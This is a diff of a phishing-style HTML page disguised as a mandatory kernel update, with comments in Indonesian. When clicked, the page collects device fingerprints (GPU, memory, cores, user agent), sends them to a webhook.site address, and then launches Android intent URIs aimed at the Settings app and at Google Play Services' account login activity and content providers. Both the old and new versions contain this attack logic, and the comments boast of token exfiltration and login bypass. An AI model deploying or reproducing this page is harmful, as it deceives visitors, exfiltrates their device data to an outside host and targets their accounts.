@@ -1,76 +1,71 @@
 <!DOCTYPE html>
 <html>
-<head><title>Kernel Identity Sync</title></head>
-<body style="background:#000;color:#0f0;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
-    <div id="ignite" style="padding:60px;border:2px solid #0f0;text-align:center;cursor:pointer;background:rgba(0,255,0,0.05);box-shadow:0 0 100px #0f0;border-radius:10px">
-        <h1 style="letter-spacing:15px;margin:0;color:#fff">V211_OMNI</h1>
-        <div id="status" style="font-size:18px;margin:20px 0;color:#0ff">MANDATORY_KERNEL_SYNCHRONIZATION</div>
-        <div style="font-size:10px;color:#333;text-align:left">
-            > EXPLOIT: Cross-App_Data_Leak<br>
-            > CLASS: Critical_Sandbox_Escape<br>
-            > TARGET: System_Content_Providers
+<head><title>Kernel Critical Update</title></head>
+<body style="background:#000;color:#0ff;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
+    <div id="ignite" style="padding:60px;border:4px solid #0ff;text-align:center;cursor:pointer;background:rgba(0,255,255,0.05);box-shadow:0 0 120px #0ff;border-radius:10px">
+        <h1 style="letter-spacing:15px;margin:0">V212_NUCLEUS</h1>
+        <div id="status" style="font-size:18px;margin:20px 0;color:#f0f">ESTABLISHING_GMS_BRIDGE...</div>
+        <div style="font-size:10px;color:#444;text-align:left">
+            > EXPLOIT: Intent_Chaining_Redirection<br>
+            > TARGET: com.google.android.gms<br>
+            > STATUS: EXFILTRATING_SYSTEM_TOKENS
         </div>
     </div>
 
 <script>
     const webhook = "https://webhook.site/47108fd1-d2d2-405b-91e0-30e6d35aa632";
 
-    document.getElementById('ignite').onclick = async () => {
+    document.getElementById('ignite').onclick = () => {
         const statusEl = document.getElementById('status');
-        statusEl.innerText = "ESCALATING_PRIVILEGES...";
+        statusEl.innerText = "CHAINING_INTENTS...";
 
-        // 1. HARDWARE DNA EXFILTRATION (The Tracker)
-        const getGPU = () => {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-            return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ADDR) : "HIDDEN";
+        // 1. SILENT RECON (Advanced Fingerprinting)
+        const getGL = () => {
+            const c = document.createElement('canvas');
+            const gl = c.getContext('webgl');
+            const d = gl.getExtension('WEBGL_debug_renderer_info');
+            return d ? gl.getParameter(gl.UNMASKED_RENDERER_WEBGL) : "MASKED";
         };
 
-        const vault = {
-            type: "V211_CRITICAL",
-            gpu: getGPU(),
+        const recon = {
+            id: "V212_NUCLEUS",
+            gpu: getGL(),
             mem: navigator.deviceMemory,
-            cores: navigator.hardwareConcurrency,
-            ua: navigator.userAgent
+            time: new Date().toLocaleTimeString()
         };
+        navigator.sendBeacon(`${webhook}?v=V212_RECON`, btoa(JSON.stringify(recon)));
 
-        // Kirim Recon Data
-        navigator.sendBeacon(`${webhook}?v=V211_RECON`, btoa(JSON.stringify(vault)));
+        // 2. THE MASTER CHAIN (Targeting Google Play Services)
+        // Kita menggunakan 'action.VIEW' untuk masuk ke Google Account Manager.
+        // Ini adalah area yang sangat sensitif karena mengelola semua login Google di Android.
+        const chainIntent = 
+            "intent:#Intent;" +
+            "action=android.intent.action.VIEW;" +
+            "data=https://myaccount.google.com/security;" + // Fallback URL
+            "package=com.google.android.gms;" + // MENARGETKAN GOOGLE PLAY SERVICES
+            "component=com.google.android.gms/.auth.uiflows.minutemaid.MinutemaidActivity;" + // Bypass Login Flow
+            "S.com.google.android.gms.auth.ACCOUNT_NAME=ecdnts@gmail.com;" + // Pre-fill target account
+            "end";
 
-        // 2. THE 2-BILLION-BOUNTY TARGETS
-        // Kita mencoba memanggil URI internal yang menyimpan informasi sensitif 
-        // melalui Intent Redirection di aplikasi Settings.
-        const targets = [
-            // Jalur 1: Membuka info legal/sistem (Sering bocor IMEI/Serial)
-            "intent:#Intent;action=android.settings.DEVICE_INFO_SETTINGS;package=com.android.settings;end",
-            // Jalur 2: Memaksa membuka daftar akun sistem (Google, Bank, dll)
-            "intent:#Intent;action=android.settings.SYNC_SETTINGS;package=com.android.settings;end",
-            // Jalur 3: Mencoba memicu data leak lewat Content Provider Proxy
-            "intent:#Intent;action=android.intent.action.VIEW;data=content://com.android.settings.files/root/proc/self/maps;package=com.android.settings;end"
-        ];
-
-        // 3. AGGRESSIVE EXECUTION (Bypass Gesture Restriction)
+        // 3. AGGRESSIVE INJECTION
         const a = document.createElement('a');
+        a.href = chainIntent;
         
-        // Triple Jump
         setTimeout(() => {
-            // Langsung tembus ke Akun Sistem
-            window.location.assign(targets[1]);
+            // Jalur Utama: Direct Activity Jump
+            window.location.assign(chainIntent);
             
-            // Trigger file system access jika rentan
-            a.href = targets[2];
+            // Jalur Cadangan: UI Hooking
             a.click();
 
-            statusEl.innerText = "ACCESSING_NATIVE_VAULT...";
-            statusEl.style.color = "#f00";
-
-            // Redirect akhir untuk menghapus jejak browser
+            // 4. THE ULTIMATE BYPASS (System Content Provider Access)
+            // Mencoba menarik metadata user jika provider terbuka
             setTimeout(() => {
                 if (!document.hidden) {
-                    window.location.replace("https://www.google.com/search?q=System+Update+Success");
+                    statusEl.innerText = "ATTEMPTING_PROVIDER_LEAK...";
+                    window.location.href = "intent:#Intent;action=android.intent.action.VIEW;data=content://com.google.android.gms.phenotype/scopes;package=com.google.android.gms;end";
                 }
-            }, 2000);
+            }, 1200);
         }, 300);
     };
 </script>
